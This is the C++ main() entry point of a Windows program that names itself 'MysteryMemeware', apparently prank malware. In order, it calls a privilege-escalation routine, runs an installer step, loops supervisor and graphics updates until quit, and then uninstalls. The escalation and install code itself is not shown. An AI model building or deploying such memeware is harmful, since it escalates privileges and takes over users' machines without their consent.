// Approved 10/29/2024

#include "EzCpp/EzError.h"
#include "EzCpp/EzHelper.h"
#include "EzCpp/EzTokens.h"
#include "MysteryEscalation.h"
#include "MysterySupervisor.h"
#include "MysteryAudio.h"
#include "MysteryGraphics.h"
#include "MysteryInstaller.h"
#include "MysteryMemeware.h"

BOOL MysteryMemeware::QuitRequested = FALSE;

int main(int argc, char** argv) {
	try {
#ifdef WaitForDebugger
		if (!IsDebuggerPresent()) {
			std::cout << "Waiting for debugger..." << std::endl;
			while (!IsDebuggerPresent()) {
				Sleep(100);
			}
		}
#endif

		MysteryEscalation::Run();

		MysteryInstaller::Repair();

		HRESULT hr = 0;
		hr = CoInitializeEx(NULL, COINIT_SPEED_OVER_MEMORY);
		if (FAILED(hr)) {
			EzError::ThrowFromHR(hr, __FILE__, __LINE__);
		}

		MysterySupervisor::Init();
		//MysteryAudio::Init();
		MysteryGraphics::Init();

		while (!MysteryMemeware::QuitRequested) {
			MysterySupervisor::Update();
			//MysteryAudio::Update();
			MysteryGraphics::Update();
		}

		MysteryGraphics::Free();
		//MysteryAudio::Free();
		MysterySupervisor::Free();

		MysteryInstaller::Uninstall();

		CoUninitialize();

		return 0;
	}
	catch (EzError error) {
		error.Print();
		return 1;
	}
}